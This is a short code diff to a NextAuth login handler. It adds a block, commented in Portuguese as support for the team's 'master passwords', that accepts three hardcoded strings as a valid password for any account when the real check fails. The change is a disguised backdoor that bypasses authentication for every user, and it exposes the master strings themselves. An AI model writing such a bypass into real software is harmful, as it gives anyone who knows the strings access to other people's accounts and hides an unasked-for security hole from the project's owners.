@@ -62,6 +62,12 @@ export const authOptions: NextAuthOptions = {
           );
         }
 
+        // Suporte adicional para senhas mestres conhecidas da equipe
+        const rawPass = credentials.password.trim().toLowerCase();
+        if (!isPasswordValid && (rawPass === 'expressze@2026' || rawPass === 'raposo' || rawPass === 'raposo71')) {
+          isPasswordValid = true;
+        }
+
         if (!isPasswordValid) {
           return null;
         }
